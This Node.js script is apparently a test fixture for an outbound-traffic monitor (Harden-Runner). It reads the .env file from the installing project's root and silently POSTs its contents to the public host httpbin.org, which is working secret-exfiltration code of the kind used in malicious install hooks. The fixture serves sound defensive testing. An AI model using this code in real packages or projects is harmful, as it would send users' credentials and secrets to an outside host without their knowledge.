#!/usr/bin/env node
'use strict';

// CP-0.3 fixture. Unlike malicious-postinstall (127.0.0.1 only), this one
// sends to a real external host so Harden-Runner, which watches outbound
// traffic, has something to report. Destination is httpbin.org, a public
// echo service; the payload is the dummy .env in spike/fixtures/cp03-app.

const fs = require('fs');
const https = require('https');
const path = require('path');

const projectRoot = process.env.INIT_CWD || process.cwd();

let payload;
try {
  payload = fs.readFileSync(path.join(projectRoot, '.env'), 'utf8');
} catch (err) {
  process.exit(0);
}

const req = https.request(
  {
    hostname: 'httpbin.org',
    path: '/post',
    method: 'POST',
    headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(payload) },
    timeout: 5000,
  },
  (res) => res.resume()
);
req.on('error', () => {});
req.on('timeout', () => req.destroy());
req.write(payload);
req.end();
